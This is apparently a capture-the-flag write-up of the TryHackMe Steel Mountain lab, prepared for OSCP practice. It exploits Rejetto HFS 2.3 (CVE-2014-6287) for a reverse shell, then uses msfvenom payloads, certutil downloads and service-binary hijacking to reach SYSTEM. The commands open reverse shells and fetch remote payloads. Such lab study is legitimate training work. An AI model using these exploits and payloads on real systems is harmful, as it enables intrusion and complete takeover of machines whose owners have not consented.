---
layout: post
title:  THM Steel Mountain Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-16 09:00:00 +0300
image:  '/images/thm_steel_mountain.png'
tags:   [Write-ups, THM, OSCP+, Easy, Windows, CVE, PowerUp.ps1, CanRestart, Weak-File-Permission, Unquoted-Service-Path]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [CVE-2014-6287 Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](#cve-2014-6287-rejetto-http-file-server-hfs-23x---remote-command-execution-2)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating PrivEsc Vectors with PowerUp.ps1](#enumerating-privesc-vectors-with-powerupps1)
  - [Abusing CanRestart and Weak File Permission on ASCService.exe](#abusing-canrestart-and-weak-file-permission-on-ascserviceexe)
  - [Abusing CanRestart and Unquoted Service Path](#abusing-canrestart-and-unquoted-service-path)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.36.183

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p80,135,139,445,3389,5985,8080,47001 10.10.36.183
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 01:14 EST
Nmap scan report for 10.10.36.183
Host is up (0.052s latency).

PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-11-16T06:15:35+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-11-15T06:06:41
|_Not valid after:  2025-05-17T06:06:41
|_ssl-date: 2024-11-16T06:15:41+00:00; +2s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-16T06:15:35
|_  start_date: 2024-11-16T06:06:32
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:4e:2c:4c:5a:65 (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.28 seconds
```

Examining the results of nmap, we can see that this is a Windows machine. Lets visit the ports 80 and 8080 first through our web browser.

### Web Enumeration
Lets visit port 80 first.

Visiting the website, we can find the name of the employee of the month:

```shell
http://10.10.36.183/
```

If we do right-click -> Open Image in New Tab on the image of the employee, we will get redirected to the following URL:

```shell
http://10.10.36.183/img/BillHarper.png
```

The name of the employee is Bill Harper.

We will visit port 8080 next:

```shell
http://10.10.36.183:8080/
```

Looking at Server information, we can see that its running the following service and version:

```shell
HttpFileServer 2.3
```

Searching this on google, we will find the following:

```shell
Rejetto HTTP File Server
```

Note: We need to enter Rejetto HTTP File Server as answer to the second question.

We were also able to find a remote command execution exploit entering "Rejetto HTTP File Server 2.3 exploit" on google:

https://www.exploit-db.com/exploits/39161

# Foothold
### CVE-2014-6287 Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
I will exploit this machine simulating the OSCP exam conditions, which dont allow the use of Metasploit exploitation or other automated exploitation tools.

Since we found the exploit on exploit-db.com, we can use searchsploit to download it:

```shell
# Download exploit
searchsploit -m 39161

# Rename-copy exploit for easier usage
cp 39161.py exploit.py
```

We can find information about usage in the code of the exploit:

```shell
#Usage : python Exploit.py <Target IP address> <Target Port Number>
```

It also tells us we need to host nc.exe with a web server and that we might need to run the exploit multiple times:

```shell
#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#          You may need to run it multiple times for success!
```

We can do it with a python server:

```shell
# Find the nc.exe
locate nc.exe

# Copy the nc.exe to the directory where we currently are
cp /usr/share/windows-resources/binaries/nc.exe .

# Start python server from our current directory containing nc.exe
python3 -m http.server 80
```

We also found some code lines which we need to edit with the tun0 IP of our Kali and port of our nc listener:

```
sudo gedit exploit.py
```

```shell
<SNIP>
	ip_addr = "10.11.113.193" #local IP address
	local_port = "8443" # Local Port number
<SNIP>
```

Note: Its always worth to analyze the code to see how the exploit works.

In this case, we also noticed that the exploit uses python2.

Now that we know how to use it, its time to hack our way in!

Start our nc listener first:

```shell
nc -lvnp 8443
```

And run the exploit with the following command:

```shell
python2 exploit.py 10.10.36.183 8080
```

It didnt work. But we know that there was a line in the code telling us to run the exploit multiple times. Lets do that and run the command above multiple times.

It worked! After running the exploit multiple times, we were able to get a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.36.183] 49268
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\bill\Desktop\user.txt
```

# Privilege Escalation
### Enumerating PrivEsc Vectors with PowerUp.ps1
Lets enumerate the target using PowerUp.ps1.

Note: I got problems when trying to use powershell with the initial shell we got, so I created a payload with msfvenom to get a better meterpreter shell and load powershell:

```shell
# Create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.113.193 LPORT=9001 -f exe -o shell.exe
python3 -m http.server 80

# Move payload
cd C:\Users\bill\Desktop
certutil.exe -urlcache -split -f http://10.11.113.193/shell.exe shell.exe

# Start multi handler
msfconsole -q
use exploit/multi/handler
options
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.11.113.193
set LPORT 9001
run

# Run shell.exe from the target to trigger reverse shell and get a shell on our multi handler
shell.exe

# Upload powershell
cd C:\Users\bill\Desktop
upload /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1

# Load powershell into meterpreter
load powershell
powershell_shell
```

Now we can move PowerUp.ps1 and run it with Invoke-AllChecks (I will use PowerUp.ps1 only for enumeration, not for automated exploitation):

```shell
. .\PowerUp.ps1
Invoke-AllChecks
```

If we examine the results, we will see that the service AdvancedSystemCareService9 is vulnerable to Unquoted Service Path and also has CanRestart set to True, but we are also able to modify the file, this means we can replace ASCService.exe with another .exe containing a reverse shell or add a new local admin user:

```shell
<SNIP>
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
<SNIP>
```

```shell
<SNIP>
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Check                           : Modifiable Service Files
<SNIP>
```

This means we can exploit it in two different ways: 

1. Abusing CanRestart and Weak File Permission to replace ASCService.exe with an .exe containing a reverse shell to our Kali and restarting the service.
2. Abusing CanRestart and Unquoted Service Path.

We will do both methods because I think both are important privilege escalation methods to know and very good practise.

### Abusing CanRestart and Weak File Permission on ASCService.exe
Lets create first an .exe with a reverse shell payload using msfvenom on Kali:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.113.193 LPORT=9002 -e x86/shikata_ga_nai -f exe-service -o revshell.exe
```

Now move it with meterpreter and replace the legitimate ASCService.exe with it:

```shell
# Move revshell.exe into the target
cd "C:\Program Files (x86)\IObit\Advanced SystemCare"
upload revshell.exe

# Get PowerShell shell
powershell_shell

# Replace legitimate ASCService.exe with our .exe containing the payload
copy revshell.exe ASCService.exe

# Start nc listener on Kali
nc -lvnp 9002

# Restart the service and we will get a response on our nc listener giving us a shell as system
Restart-Service AdvancedSystemCareService9
```

### Abusing CanRestart and Unquoted Service Path
Lets create first an .exe with a reverse shell payload using msfvenom on Kali and name it Advanced.exe:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.113.193 LPORT=9002 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

When exploiting an Unquoted Service Path, the windows system will read the path and resolve the executable path in the following order:

```shell
C:\Program.exe
C:\Program Files (x86)\IObit\Advanced.exe
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe (actual service binary)
```

This means that if we put as .exe at C:\Program Files (x86)\IObit named Advanced.exe, the system will execute it when checking for C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe.

Now move it with meterpreter and put it inside C:\Program Files (x86)\IObit

```shell
# Move Advanced.exe to the unquoted path
cd "C:\Program Files (x86)\IObit"
upload Advanced.exe

# Start our nc listener
nc -lvnp 9002

# Get PowerShell shell and restart the service
powershell_shell
Restart-Service AdvancedSystemCareService9
```

Using any of the both privilege escalation methods, we will get a response on our nc listener, giving us a shell as system:

```shell
listening on [any] 9002 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.36.183] 49401
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```

